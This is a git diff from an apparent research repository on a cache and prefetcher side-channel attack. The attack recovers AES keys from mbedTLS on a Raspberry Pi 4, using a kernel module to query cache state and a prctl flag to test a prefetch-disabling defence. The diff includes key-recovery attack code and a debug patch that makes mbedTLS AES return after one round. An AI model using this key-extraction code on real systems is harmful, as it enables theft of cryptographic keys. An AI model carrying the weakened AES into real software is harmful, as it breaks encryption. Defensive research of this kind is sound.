@@ -1,0 +1,894 @@
+diff --git a/aes-attack/lib/mbedtls-3.3.0/library/aes.c b/aes-attack/lib/mbedtls-3.3.0/library/aes.c
+index c7c6822..edc6b9f 100644
+--- a/aes-attack/lib/mbedtls-3.3.0/library/aes.c
++++ b/aes-attack/lib/mbedtls-3.3.0/library/aes.c
+@@ -815,6 +815,7 @@ int mbedtls_internal_aes_encrypt( mbedtls_aes_context *ctx,
+                                   unsigned char output[16] )
+ {
+     int i;
++    volatile int always_true = 1; // DEBUG
+     uint32_t *RK = ctx->buf + ctx->rk_offset;
+     struct
+     {
+@@ -830,6 +831,7 @@ int mbedtls_internal_aes_encrypt( mbedtls_aes_context *ctx,
+     for( i = ( ctx->nr >> 1 ) - 1; i > 0; i-- )
+     {
+         AES_FROUND( t.Y[0], t.Y[1], t.Y[2], t.Y[3], t.X[0], t.X[1], t.X[2], t.X[3] );
++        if (always_true){return 0;} // DEBUG
+         AES_FROUND( t.X[0], t.X[1], t.X[2], t.X[3], t.Y[0], t.Y[1], t.Y[2], t.Y[3] );
+     }
+ 
+diff --git a/aes-attack/program/CMakeLists.txt b/aes-attack/program/CMakeLists.txt
+index 8d35b6c..69b20f9 100644
+--- a/aes-attack/program/CMakeLists.txt
++++ b/aes-attack/program/CMakeLists.txt
+@@ -9,11 +9,11 @@ set(CMAKE_BUILD_TYPE Debug)
+ 
+ # define main executables
+ add_executable("attacker_automated" "src/attacker_automated.cc" "src/LUTHypothesis.cc" "src/cache_query.cc" "src/common_test.cc")
+-add_executable("victim" "src/victim.cc" "src/common_test.cc")
+-add_executable("fnf_calibrate" "src/fnf_calibrate.cc" "src/common_test.cc")
++# add_executable("victim" "src/victim.cc" "src/common_test.cc")
++# add_executable("fnf_calibrate" "src/fnf_calibrate.cc" "src/common_test.cc")
+ # enable warnings
+ target_compile_options("attacker_automated" PRIVATE "-Wall")
+-target_compile_options("victim" PRIVATE "-Wall")
++# target_compile_options("victim" PRIVATE "-Wall")
+ 
+ # link with -pthread
+ find_package(Threads REQUIRED)
+@@ -21,7 +21,7 @@ target_link_libraries("attacker_automated" Threads::Threads)
+ 
+ # enable C++17 support
+ target_compile_features("attacker_automated" PUBLIC cxx_std_17)
+-target_compile_features("victim" PUBLIC cxx_std_17)
++# target_compile_features("victim" PUBLIC cxx_std_17)
+ 
+ # Compile attacker as PIC binary. This is beneficial for Flush&Reload on
+ # library code: with PIC set, the compiler does not generate stubs for
+@@ -33,4 +33,6 @@ set_property(TARGET "attacker_automated" PROPERTY POSITION_INDEPENDENT_CODE TRUE
+ include_directories("../lib/mbedtls/include")
+ file(GLOB MBEDLIB "../lib/mbedtls/library/*.so")
+ target_link_libraries("attacker_automated" ${MBEDLIB})
+-target_link_libraries("victim" ${MBEDLIB})
++# target_link_libraries("victim" ${MBEDLIB})
++
++include_directories("../../covert-channel/kernel-modules/rpi4-module-cache")
+diff --git a/aes-attack/program/runscript.py b/aes-attack/program/runscript.py
+deleted file mode 100644
+index 4987543..0000000
+--- a/aes-attack/program/runscript.py
++++ /dev/null
+@@ -1,26 +0,0 @@
+-import random
+-import os
+-import subprocess
+-import time
+-
+-while True:
+-    key = random.randbytes(16)
+-    key_str = ""
+-
+-    for by in key:
+-       key_str += f"0x{int(by):02x}" + ", "
+-
+-    with open("src/key.hh", "w") as keyfile:
+-        keyfile.write(key_str)
+-    
+-    subprocess.run(["make", "-C", "build"])
+-    subprocess.run(["bash", "runscript_internal.sh"])
+-    os.remove("out.log")
+-    os.remove("maps-LUT0-anchor.txt")
+-    os.remove("maps-LUT0-dependent.txt")
+-    os.remove("maps-LUT1-anchor.txt")
+-    os.remove("maps-LUT1-dependent.txt")
+-    os.remove("maps-LUT2-anchor.txt")
+-    os.remove("maps-LUT2-dependent.txt")
+-    os.remove("maps-LUT3-anchor.txt")
+-    os.remove("maps-LUT3-dependent.txt")
+diff --git a/aes-attack/program/runscript_prefence.py b/aes-attack/program/runscript_prefence.py
+new file mode 100644
+index 0000000..ab0d210
+--- /dev/null
++++ b/aes-attack/program/runscript_prefence.py
+@@ -0,0 +1,45 @@
++import os
++import subprocess
++import datetime
++import glob
++import secrets
++import sys
++
++if len(sys.argv) < 2 or sys.argv[1] not in ['with_prefetch', 'without_prefetch']:
++    print("Please specify either 'with_prefetch' or 'without_prefetch' as first command line parameter.")
++    sys.exit(1)
++
++TAG = sys.argv[1]
++NO_ITERATIONS = 100
++START_OFFSET = 0
++
++with open("src/prefence_state.hh", "w") as file:
++    file.write("#pragma once\n")
++    if TAG == "with_prefetch":
++        file.write("#define ENABLE_PREFENCE (false)")
++    elif TAG == "without_prefetch":
++        file.write("#define ENABLE_PREFENCE (true)")
++
++def update_key():
++    new_key = secrets.token_bytes(16)
++    keystr = ""
++    for i in range(len(new_key)):
++        keystr += f"0x{new_key[i]:02x}, "
++    with open("src/key.hh", "w") as keyfile:
++        keyfile.write(keystr)
++
++
++for iteration in range(START_OFFSET, START_OFFSET + NO_ITERATIONS):
++    update_key()
++    print(f"{datetime.datetime.now()} iteration: {iteration}")
++
++    subprocess.run(["make", "-C", "build"])
++    subprocess.run(["bash", "runscript_internal.sh"])
++    subprocess.run(["gzip", "out.log"])
++    os.rename("out.log.gz", f"out-{TAG}-{iteration:03d}.log.gz")
++    for mapfile in glob.glob("maps-*.txt"):
++        os.rename(mapfile, f"out-{mapfile}.{TAG}-{iteration:03d}.txt")
++
++notify_path = os.path.expanduser("~/notify.sh")
++if os.path.isfile(notify_path):
++    subprocess.run(["bash", notify_path, "Experiment done."])
+diff --git a/aes-attack/program/src/attacker_automated.cc b/aes-attack/program/src/attacker_automated.cc
+index c45551e..7737a0b 100644
+--- a/aes-attack/program/src/attacker_automated.cc
++++ b/aes-attack/program/src/attacker_automated.cc
+@@ -19,10 +19,10 @@
+ 
+ #include "common_test.hh"
+ #include "nops.hh"
+-#include "semaphores.hh"
+ #include "cores.hh"
+ #include "LUTHypothesis.hh"
+ #include "cache_query.hh"
++#include "prefence.hh"
+ 
+ extern Mapping cache_pa;
+ 
+@@ -32,17 +32,14 @@ using std::string;
+ using std::map;
+ using std::vector;
+ 
+-#define PIPE_READ_END (0)
+-#define PIPE_WRITE_END (1)
+-
+-//#define SLEEPER_START_DELAY (3800)
+-#define FNR_TARGET ((void*)(((uint8_t*)&mbedtls_aes_setkey_enc)))
+-
+ // Controls whether traces (hit maps) are collected on the hardware (true)
+ // or previously recorded traces are loaded from a file (false).
+ #define COLLECT_TRACES_ANCHOR (true)
+ #define COLLECT_TRACES_DEPENDENT (true)
+ 
++#include "prefence_state.hh"
++//#define ENABLE_PREFENCE (false)
++
+ // padding/access functions
+ #include "aligned_code.hh"
+ 
+@@ -115,131 +112,9 @@ void unlink_semaphore_if_exists(string name) {
+ }
+ 
+ /**
+- * @brief      Starts a victim process.
+- *
+- * @param      plaintext  The plaintext to provide to the victim process
+- *
+- * @return     The pid of the victim process
+- */
+-pid_t start_victim(plaintext_t const& plaintext) {
+-	// start victim with plaintext as command line parameter
+-	string plaintext_str = plaintext_to_string(plaintext, 16);
+-	string victim_args[] = {"build/victim", plaintext_str};
+-	char* const victim_args_char[] = {&victim_args[0][0], &victim_args[1][0], NULL};
+-	fflush(stdout);
+-	pid_t pid = fork();
+-	switch(pid) {
+-		case 0: {
+-			// set up semaphore
+-			sem_t* sem_attacker_fork = sem_open(SEM_ATTACKER_FORK_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
+-
+-			// pin forked process to victim core
+-			move_process_to_cpu(0, CPU_CORE_VICTIM);
+-
+-			sem_post(sem_attacker_fork);
+-
+-			int ret = execvp(victim_args[0].c_str(), victim_args_char);
+-			if (ret != 0) {
+-				perror("execvp failed");
+-				exit(1);
+-			}
+-			break;
+-		}
+-		case -1:
+-			perror("fork failed");
+-			exit(1);
+-			break;
+-		default:
+-			break;
+-	}
+-	return pid;
+-}
+-
+-/**
+- * @brief      Starts a "colocated" attacker process, i.e. an attacker
+- *             process on the processor core where the victim runs.
+- *
+- * @param[in]  lut_i  The number of the lookup table that is currently
+- *                    targeted.
+- *
+- * @return     Pair: `.first`: pid of the colocated attacker process.
+- *             `.second`: Read end of a pipe to the colocated attacker
+- *             process.
+- */
+-pair<pid_t, int> start_attacker_colocated(uint8_t lut_i) {
+-	int pipefd_colo_to_main[2];
+-	pipe(pipefd_colo_to_main);
+-	fflush(stdout);
+-	pid_t pid = fork();
+-	switch(pid) {
+-		case 0: {
+-			close(pipefd_colo_to_main[PIPE_READ_END]);
+-
+-			// pin forked process to victim core
+-			move_process_to_cpu(0, CPU_CORE_VICTIM);
+-			printf("[B] co-located attacker on %d\n", get_current_cpu_core());
+-			
+-			// set up semaphores
+-			sem_t* sem_attacker_prepare_colo = sem_open(SEM_ATTACKER_PREPARE_COLO_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
+-			sem_t* sem_attacker_probe = sem_open(SEM_ATTACKER_PROBE_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
+-
+-			// set up cache query
+-			cache_query_setup();
+-
+-			// sleep until the victim did relevant memory operations;
+-			// the other attacker process will then send an interrupt that
+-			// allows this process to be scheduled on the victim core.
+-			sem_post(sem_attacker_prepare_colo);
+-			sem_wait(sem_attacker_probe);
+-
+-			// probing: perform a load request that (hopefully) picks up
+-			// the previous sequence. Note that we perform the first access
+-			// at the middle of the probe array (+1024) and not at the
+-			// beginning. We do this to be able to observe prefetching in
+-			// negative direction as well.
+-			switch (lut_i) {
+-				case 0:				
+-					access_FT0_0(cache_pa.base_addr + REGION_SIZE);
+-					break;
+-				case 1:
+-					access_FT1_0(cache_pa.base_addr + REGION_SIZE);
+-					break;
+-				case 2:
+-					access_FT2_0(cache_pa.base_addr + REGION_SIZE);
+-					break;
+-				case 3:
+-					access_FT3_0(cache_pa.base_addr + REGION_SIZE);
+-					break;
+-				default:
+-					assert(false);
+-					break;
+-			}
+-
+-			print_hits();
+-			
+-			// report cache hits back to main process
+-			uint64_t cache_state = get_cache_state();
+-			write(pipefd_colo_to_main[PIPE_WRITE_END], &cache_state, sizeof(cache_state));
+-			close(pipefd_colo_to_main[PIPE_WRITE_END]);
+-			exit(0);
+-			break;
+-		}
+-		case -1:
+-			perror("fork failed (co-located attacker)");
+-			exit(1);
+-			break;
+-		default:
+-			close(pipefd_colo_to_main[PIPE_WRITE_END]);
+-			break;
+-	}
+-	return pair<pid_t, int> {pid, pipefd_colo_to_main[PIPE_READ_END]};
+-}
+-
+-/**
+- * @brief      Run an experiment, i.e. collect traces (hit maps). Starts a
+- *             colocated attacker process and a victim process. Each
++ * @brief      Run an experiment, i.e. collect traces (hit maps). Each
+  *             repetition corresponds to one execution of the victim
+- *             process.
++ *             code (AES).
+  *
+  * @param[in]  num_repetitions  The number of repetitions to perform
+  * @param[in]  lut_i            The number of the lookup table to target
+@@ -262,66 +137,50 @@ pair<pid_t, int> start_attacker_colocated(uint8_t lut_i) {
+ hit_map_t run_experiment(unsigned int num_repetitions, uint8_t lut_i, plaintext_t const& plaintext) {
+ 	hit_map_t hit_map;
+ 
+-	// open the semaphores (for synchronization with the other attacker
+-	// process)
+-	unlink_semaphore_if_exists(SEM_ATTACKER_PREPARE_COLO_NAME);
+-	unlink_semaphore_if_exists(SEM_ATTACKER_PROBE_NAME);
+-	unlink_semaphore_if_exists(SEM_ATTACKER_FORK_NAME);
+-	sem_t* sem_attacker_prepare_colo = sem_open(SEM_ATTACKER_PREPARE_COLO_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
+-	sem_t* sem_attacker_probe = sem_open(SEM_ATTACKER_PROBE_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
+-	sem_t* sem_attacker_fork = sem_open(SEM_ATTACKER_FORK_NAME, O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO, 0);
+-
+ 	for (uint64_t repetition = 0; repetition < num_repetitions; repetition++) {
+-		// start other attacker process on victim core
+-		pair<pid_t, int> colocated_attacker = start_attacker_colocated(lut_i);
+-		pid_t const& colocated_attacker_pid = colocated_attacker.first;
+-		int const& colocated_attacker_pipefd_read_end = colocated_attacker.second;
++		// victim code setup
++		uint8_t key[] = {
++			#include "key.hh"
++		};
++		uint8_t output[16];
++
++		// library call
++		mbedtls_aes_context ctx;
++		mbedtls_aes_init(&ctx);
++		int pfdis_before = get_pfdis_flag();
++		#if ENABLE_PREFENCE
++			set_pfdis_flag(1);
++		#else
++			set_pfdis_flag(0);
++		#endif
++		mbedtls_aes_setkey_enc(&ctx, key, 128);
++		mbedtls_internal_aes_encrypt(&ctx, plaintext.data(), output);
++		set_pfdis_flag(pfdis_before);
+ 		
+-		// wait for other attacker process to get ready
+-		sem_wait(sem_attacker_prepare_colo);
+-
+-		// start victim and wait until fork() is done 
+-		pid_t victim_pid = start_victim(plaintext);
+-		sem_wait(sem_attacker_fork);
+-
+-		// interrupt victim when a specific code cache line is loaded
+-		void* fnr_target = FNR_TARGET;
+-		flush(fnr_target);
+-		mfence();
+-		size_t fr_tries;
+-		for (fr_tries = 0; fr_tries < 40960; fr_tries++) {
+-			NOP1024
+-			
+-			uint64_t time = reload_flush_t(fnr_target);
+-			
+-			if (time < FNR_THRESHOLD) {
++		// probing: perform a load request that (hopefully) picks up
++		// the previous sequence. Note that we perform the first access
++		// at the middle of the probe array (+1024) and not at the
++		// beginning. We do this to be able to observe prefetching in
++		// negative direction as well.
++		switch (lut_i) {
++			case 0:
++				access_FT0_0(cache_pa.base_addr + REGION_SIZE);
++				break;
++			case 1:
++				access_FT1_0(cache_pa.base_addr + REGION_SIZE);
++				break;
++			case 2:
++				access_FT2_0(cache_pa.base_addr + REGION_SIZE);
++				break;
++			case 3:
++				access_FT3_0(cache_pa.base_addr + REGION_SIZE);
++				break;
++			default:
++				assert(false);
+ 				break;
+-			}
+ 		}
+-		printf("no. of f&r tries: %zu\n", fr_tries);
+-
+-		// sleep some more cycles (fixed amount)
+-		//for (uint64_t tsc_start = rdtsc(); rdtsc() - tsc_start < SLEEPER_START_DELAY;);
+-
+-		// wake up attacker on victim core
+-		sem_post(sem_attacker_probe);
+-		// issue inter-processor interrupt (IPI)
+-		syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0);
+-		// alternative way to trigger an interrupt: move the victim to
+-		// another core
+-		// move_process_to_cpu(victim_pid, CPU_CORE_UNRELATED);
+-		
+-		// wait for victim to exit
+-		waitpid(victim_pid, NULL, 0);
+-		
+-		// Retrieve cache hits from colocated attacker via unix pipe
+-		uint64_t cache_state;
+-		read(colocated_attacker_pipefd_read_end, &cache_state, sizeof(uint64_t));
+-		
+-		// close pipe and wait for colocated attacker to exit
+-		close(colocated_attacker_pipefd_read_end);
+-		waitpid(colocated_attacker_pid, NULL, 0);
+-	
++
++		uint64_t cache_state = get_cache_state();
+ 		printf("Updating map, values (normalized):\n");
+ 		for (size_t i = 0; i < sizeof(cache_state) * 8; i++) {
+ 			bool hit = (cache_state & (1ULL << i)) != 0;
+@@ -336,20 +195,22 @@ hit_map_t run_experiment(unsigned int num_repetitions, uint8_t lut_i, plaintext_
+ 			printf("dist: %s, counter: %lu\n", LUTHypothesis::x4_to_str_human(p.first).c_str(), p.second);
+ 		}
+ 		fflush(stdout);
++
++		// cleanup
++		mbedtls_aes_free(&ctx);
++		cache_query_reset();
+ 	}
+ 
+ 	return hit_map;
+ }
+ 
+ int main(int argc, char* argv[]) {
+-	// enable ccr on victim core
+-	move_process_to_cpu(0, CPU_CORE_VICTIM);
+-	timing_init();
+-
+ 	// move attacker process to attacker core
+ 	move_process_to_cpu(0, CPU_CORE_ATTACKER);
+ 	// enable ccr on attacker core
+ 	timing_init();
++	// set up kernel module for cache querying via RAMINDEX
++	cache_query_setup();
+ 
+ 	printf("Timestamp (program start): %ld\n", time(NULL));
+ 
+@@ -412,7 +273,7 @@ int main(int argc, char* argv[]) {
+ 				printf("Collecting anchor traces for LUT %zu, PT pos %zu, value %.2x\n", lut_i, anchor_byte_pos, plaintext[anchor_byte_pos]);
+ 				/*size_t map_idx =*/ lut_byte_hyp.add_map(
+ 					HIT_MAP_ANCHOR, anchor_byte_pos, plaintext,
+-					run_experiment(15000, lut_i, plaintext)
++					run_experiment(60000, lut_i, plaintext)
+ 				);
+ 
+ 				// DEBUG
+@@ -449,6 +310,7 @@ int main(int argc, char* argv[]) {
+ 
+ 		// DEBUG
+ 		// if(always_true)break;
++		// if(always_true)continue;
+ 				
+ 		// Now proceed to find the non-anchor bytes (i.e., dependent bytes)
+ 		// in the LUT.
+@@ -479,7 +341,7 @@ int main(int argc, char* argv[]) {
+ 						printf("Collecting traces for LUT %zu, dependent byte pos %zu, flipped bit %zu -> %.2x, anchor PT value %.2x\n", lut_i, dependent_byte_pos, flipped_bit, plaintext[dependent_byte_pos], anchor_byte_pt_value);
+ 						plaintext[anchor_byte_pos] = anchor_byte_pt_value;
+ 						lut_byte_hyp.add_map(
+-							HIT_MAP_DEPENDENT, dependent_byte_pos, plaintext, run_experiment(15000, lut_i, plaintext)
++							HIT_MAP_DEPENDENT, dependent_byte_pos, plaintext, run_experiment(30000, lut_i, plaintext)
+ 						);
+ 					}
+ 
+@@ -505,8 +367,8 @@ int main(int argc, char* argv[]) {
+ 
+ 		puts("");
+ 
+-		// DEBUG (only find the first 2*4 key byte nibbles for now)
+-		// if(always_true && lut_i == 8)break;
++		// DEBUG (only find the first 4 key byte nibbles for now)
++		// if(always_true)break;
+ 	}
+ 
+ 	// Print final summary at the end of the output.		
+diff --git a/aes-attack/program/src/cache_query.cc b/aes-attack/program/src/cache_query.cc
+index 24ecb94..6a9471c 100644
+--- a/aes-attack/program/src/cache_query.cc
++++ b/aes-attack/program/src/cache_query.cc
+@@ -1,40 +1,116 @@
+ #include "cache_query.hh"
+ 
+-Mapping cache_pa;
+ uint64_t cache_state = 0;
+ 
+ struct timespec const t_req { .tv_sec = 0, .tv_nsec = 1000 /* 1µs */ };
+ struct timespec t_rem;
+ 
+-void cache_query_setup() {
+-	cache_pa = allocate_mapping(2 * REGION_SIZE);
+-	flush_mapping(cache_pa);
+-	// make sure we can use an uint64_t to store the cache state
+-	assert(cache_pa.size / CACHE_LINE_WIDTH <= 64);
+-}
++Mapping cache_pa;
++
++#if CACHE_QUERY_METHOD == CACHE_QUERY_METHOD_FLUSH_FLUSH
++
++	void cache_query_setup() {
++		cache_pa = allocate_mapping(2 * REGION_SIZE);
++		flush_mapping(cache_pa);
++		// make sure we can use an uint64_t to store the cache state
++		assert(cache_pa.size / CACHE_LINE_WIDTH <= 64);
++	}
++
++	void cache_query() {
++		nanosleep(&t_req, &t_rem);
++
++		cache_state = 0;
++
++		// warmup
++		for (size_t i = 0; i < 1000; i++) {
++			flush(cache_pa.base_addr);
++		}
++
++		for (size_t clidx = 16-9; clidx < 16+12; clidx++) {
++			// size_t permuted_clidx = permute(no_cls, clidx);
++			size_t permuted_clidx = clidx;
++			size_t time = flush_t(cache_pa.base_addr + permuted_clidx * CACHE_LINE_WIDTH);
++			// size_t time = reload_flush_t(cache_pa.base_addr + permuted_clidx * CACHE_LINE_WIDTH);
++			// if (time < FNR_THRESHOLD) {
++			if (time > FNF_THRESHOLD) {
++				cache_state |= (1ULL << permuted_clidx);
++			}
++		}
++
++		flush_mapping(cache_pa);
++	}
++
++#elif CACHE_QUERY_METHOD == CACHE_QUERY_METHOD_KERNEL_MODULE
++
++	int cache_dev_fd;
++	// Mapping resp_l1;
++	Mapping resp_l2;
++	struct cache_request_setup setup_global;
++
++	void cache_query_setup() {
++		cache_pa = allocate_mapping(2 * REGION_SIZE);
++		flush_mapping(cache_pa);
++		// make sure we can use an uint64_t to store the cache state
++		assert(cache_pa.size / CACHE_LINE_WIDTH <= 64);
++
++		// allocate sufficient memory for query responses
++		// resp_l1 = allocate_mapping(NUM_LINES_L1 + 1 * sizeof(size_t));
++		resp_l2 = allocate_mapping(NUM_LINES_L2 + 1 * sizeof(size_t));
++		// open device file for communication with the kernel module
++		cache_dev_fd = open(DEVICE_FILE_PATH, 0);
++		if (cache_dev_fd < 0) {
++			printf("Can't open device file: %s\n", DEVICE_FILE_NAME);
++			exit(-1);
++		}
++
++		// prepare a setup struct (to be sent to the kernel module)
++		pid_t my_pid = getpid();
++		setup_global = (struct cache_request_setup) {
++			.pid = my_pid,
++			.pa_base_addr = cache_pa.base_addr,
++			.pa_size = cache_pa.size,
++			// .resp_l1 = (size_t*)resp_l1.base_addr,
++			// .resp_l1_size = resp_l1.size,
++			.resp_l1 = NULL,
++			.resp_l1_size = 0,
++			.resp_l2 = (size_t*)resp_l2.base_addr,
++			.resp_l2_size = resp_l2.size
++		};
+ 
+-void cache_query() {
+-	nanosleep(&t_req, &t_rem);
+-	
+-	cache_state = 0;
+-	
+-	// warmup
+-	for (size_t i = 0; i < 1000; i++) {
+-		flush(cache_pa.base_addr);
++		// send setup struct to kernel module
++		int res = ioctl(cache_dev_fd, IOCTL_SETUP, &setup_global);
++		if (res != 0) {
++			exit(-2);
++		}
+ 	}
+-	
+-	for (size_t clidx = 16-9; clidx < 16+12; clidx++) {
+-		// size_t permuted_clidx = permute(no_cls, clidx);
+-		size_t permuted_clidx = clidx;
+-		size_t time = flush_t(cache_pa.base_addr + permuted_clidx * CACHE_LINE_WIDTH);
+-		// size_t time = reload_flush_t(cache_pa.base_addr + permuted_clidx * CACHE_LINE_WIDTH);
+-		// if (time < FNR_THRESHOLD) {
+-		if (time > FNF_THRESHOLD) {
+-			cache_state |= (1ULL << permuted_clidx);
++
++	void cache_query() {
++		nanosleep(&t_req, &t_rem);
++
++		int res = ioctl(cache_dev_fd, IOCTL_QUERY, CACHE_L2);
++		if (res != 0) {
++			exit(-1);
+ 		}
++		cache_state = 0;
++
++		size_t num_hits = *((size_t*)resp_l2.base_addr);
++		for (size_t i = 1; i <= num_hits; i++) {
++			size_t offset = ((size_t*)resp_l2.base_addr)[i];
++			size_t cl_no = offset / CACHE_LINE_WIDTH;
++			if (cl_no >= 16-9 && cl_no <= 16+12) {
++				cache_state |= (1ULL << cl_no);
++			}
++		}
++
++		flush_mapping(cache_pa);
+ 	}
++#else
++	#error Unknown cache query method
++#endif
+ 
++void cache_query_reset() {
+ 	flush_mapping(cache_pa);
++	mfence();
+ }
+ 
+ void print_hits(uint64_t _cache_state) {
+diff --git a/aes-attack/program/src/cache_query.hh b/aes-attack/program/src/cache_query.hh
+index 6969671..943385f 100644
+--- a/aes-attack/program/src/cache_query.hh
++++ b/aes-attack/program/src/cache_query.hh
+@@ -3,19 +3,40 @@
+ #include <stddef.h>
+ #include <inttypes.h>
+ #include <time.h>
++#include <sys/types.h>
++#include <sys/ioctl.h>
++
++#include "cache_structures.h"
++#include "cache_ioctl.h"
+ 
+ #include "common_test.hh"
+ 
+ #define REGION_SIZE (1024)
+ 
+-#define FNR_THRESHOLD (217) // Flush+Reload threshold
+-#define FNF_THRESHOLD (240) // Flush+Flush threshold
++// #define FNR_THRESHOLD (360) // Flush+Reload threshold
++// #define FNR_THRESHOLD (270) // Flush+Reload threshold
++//#include "fnr_threshold.hh"
++
++#define FNF_THRESHOLD (240) // Flush+Flush threshold (only used when
++                            // CACHE_QUERY_METHOD is CACHE_QUERY_METHOD_FLUSH_FLUSH)
++
++#define DEVICE_FILE_PATH ("/dev/" DEVICE_FILE_NAME)
++
++#define CACHE_QUERY_METHOD_KERNEL_MODULE (0)
++#define CACHE_QUERY_METHOD_FLUSH_FLUSH (1)
++
++///////////////////////////////////
++// SET CACHE QUERY METHOD HERE:
++#define CACHE_QUERY_METHOD CACHE_QUERY_METHOD_KERNEL_MODULE
++// #define CACHE_QUERY_METHOD CACHE_QUERY_METHOD_FLUSH_FLUSH
++///////////////////////////////////
+ 
+ static inline size_t permute(size_t upper_bound, size_t original_idx) {
+     return ((original_idx * 167u) + 13u) & (upper_bound - 1);
+ }
+ void cache_query_setup();
+ void cache_query();
++void cache_query_reset();
+ void print_hits(uint64_t _cache_state);
+ void print_hits();
+ uint64_t get_cache_state();
+diff --git a/aes-attack/program/src/common_test.cc b/aes-attack/program/src/common_test.cc
+index 6ed6e29..23eabe6 100644
+--- a/aes-attack/program/src/common_test.cc
++++ b/aes-attack/program/src/common_test.cc
+@@ -44,4 +44,10 @@ void flush_mapping(Mapping const& mapping) {
+ 		flush(ptr);
+ 	}
+ 	mfence();
++}
++
++void unmap_mapping(Mapping& mapping) {
++	munmap(mapping.base_addr, mapping.size);
++	mapping.base_addr = NULL;
++	mapping.size = 0;
+ }
+\ No newline at end of file
+diff --git a/aes-attack/program/src/common_test.hh b/aes-attack/program/src/common_test.hh
+index 16719fe..f5f78c4 100644
+--- a/aes-attack/program/src/common_test.hh
++++ b/aes-attack/program/src/common_test.hh
+@@ -149,4 +149,5 @@ cpu_set_t build_cpuset(int cpu);
+ int move_process_to_cpu(pid_t pid, int cpu);
+ int get_current_cpu_core();
+ Mapping allocate_mapping(size_t mem_size);
+-void flush_mapping(Mapping const& mapping);
+\ No newline at end of file
++void flush_mapping(Mapping const& mapping);
++void unmap_mapping(Mapping& mapping);
+\ No newline at end of file
+diff --git a/aes-attack/program/src/cores.hh b/aes-attack/program/src/cores.hh
+index fb45152..9f6ff18 100644
+--- a/aes-attack/program/src/cores.hh
++++ b/aes-attack/program/src/cores.hh
+@@ -1,4 +1,4 @@
+-#define CPU_CORE_VICTIM     (3)
++// #define CPU_CORE_VICTIM     (3)
+ #define CPU_CORE_ATTACKER   (2)
+-#define CPU_CORE_UNRELATED1 (1)
+-#define CPU_CORE_UNRELATED2 (0)
+\ No newline at end of file
++// #define CPU_CORE_UNRELATED1 (1)
++// #define CPU_CORE_UNRELATED2 (0)
+\ No newline at end of file
+diff --git a/aes-attack/program/src/prefence.hh b/aes-attack/program/src/prefence.hh
+new file mode 100644
+index 0000000..7b737b7
+--- /dev/null
++++ b/aes-attack/program/src/prefence.hh
+@@ -0,0 +1,22 @@
++#pragma once
++
++#include <stdlib.h> // EXIT_FAILURE
++
++#include <sys/prctl.h>
++#define PR_SET_PREFETCH_DISABLE     128
++#define PR_GET_PREFETCH_DISABLE     129
++
++static inline void set_pfdis_flag(int new_value) {
++    int ret = prctl(PR_SET_PREFETCH_DISABLE, new_value, NULL, NULL);
++    if (ret != 0) {
++        exit(EXIT_FAILURE);
++    }
++}
++
++static inline int get_pfdis_flag(void) {
++    int flag = prctl(PR_GET_PREFETCH_DISABLE, NULL, NULL, NULL);
++    if (flag != 0 && flag != 1) {
++        exit(EXIT_FAILURE);
++    }
++    return flag;
++}
+\ No newline at end of file
+diff --git a/aes-attack/program/src/prefence_state.hh b/aes-attack/program/src/prefence_state.hh
+new file mode 100644
+index 0000000..ea07def
+--- /dev/null
++++ b/aes-attack/program/src/prefence_state.hh
+@@ -0,0 +1,2 @@
++#pragma once
++#define ENABLE_PREFENCE (false)
+\ No newline at end of file
+diff --git a/covert-channel/kernel-modules/rpi4-module-cache/cache.h b/covert-channel/kernel-modules/rpi4-module-cache/cache.h
+index 562b0c1..f6a6579 100644
+--- a/covert-channel/kernel-modules/rpi4-module-cache/cache.h
++++ b/covert-channel/kernel-modules/rpi4-module-cache/cache.h
+@@ -1,7 +1,6 @@
+ #pragma once
+ 
+-#include <stdbool.h>
+ #include "cache_structures.h"
+ 
+ size_t run_query_l1(uint64_t* translation_table, size_t no_translation_table_entries, size_t* l1_hits);
+-size_t run_query_l2(uint64_t* translation_table, size_t no_translation_table_entries, size_t* l2_hits);
+\ No newline at end of file
++size_t run_query_l2(uint64_t* translation_table, size_t no_translation_table_entries, size_t* l2_hits);
+diff --git a/covert-channel/kernel-modules/rpi4-module-cache/cache_structures.h b/covert-channel/kernel-modules/rpi4-module-cache/cache_structures.h
+index 6b368f4..d185ed0 100644
+--- a/covert-channel/kernel-modules/rpi4-module-cache/cache_structures.h
++++ b/covert-channel/kernel-modules/rpi4-module-cache/cache_structures.h
+@@ -1,7 +1,5 @@
+ #pragma once
+ 
+-#include <stdbool.h>
+-
+ // Cortex A72: 32 KiB L1D cache, 2 ways
+ #define WAYS_L1 (2)
+ #define SETS_L1 (32 * 1024 / 64 / WAYS_L1)
+diff --git a/covert-channel/kernel-modules/rpi4-module-cache/main.c b/covert-channel/kernel-modules/rpi4-module-cache/main.c
+index 69c2a58..1b8a17a 100644
+--- a/covert-channel/kernel-modules/rpi4-module-cache/main.c
++++ b/covert-channel/kernel-modules/rpi4-module-cache/main.c
+@@ -104,10 +104,9 @@ uint64_t translate_virt_to_phys_addr(struct mm_struct* mm, uint8_t* userspace_vi
+ 	pmd = pmd_offset(pud, addr);
+ 	if (pmd_none(*pmd) || pmd_bad(*pmd)) goto err;
+ 
+-	ptep = pte_offset_map(pmd, addr);
+-	if (!ptep) {
+-		goto err;
+-	}
++	ptep = pte_offset_kernel(pmd, addr);
++	if (pte_none(*ptep)) goto err;
++
+ 	pte = *ptep;
+ 	page = pte_page(pte);
+ 	if (!page) goto err;
+@@ -194,7 +193,11 @@ long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl
+ 			// for each page in the probe array (defined by setup.
+ 			// pa_base_addr and setup.pa_size), we want to store the
+ 			// physical address for later use.
+-			no_translation_table_entries = setup.pa_size / PAGE_SIZE;
++			if (setup.pa_size % PAGE_SIZE == 0) {
++				no_translation_table_entries = setup.pa_size / PAGE_SIZE;
++			} else {
++				no_translation_table_entries = (setup.pa_size / PAGE_SIZE) + 1;
++			}
+ 			if (no_translation_table_entries > MAX_TRANSLATION_TABLE_ENTRIES) {
+ 				printk(KERN_WARNING "Insufficient translation table size. Increase MAX_TRANSLATION_TABLE_ENTRIES to at least %zu.\n", no_translation_table_entries);
+ 				return -1;
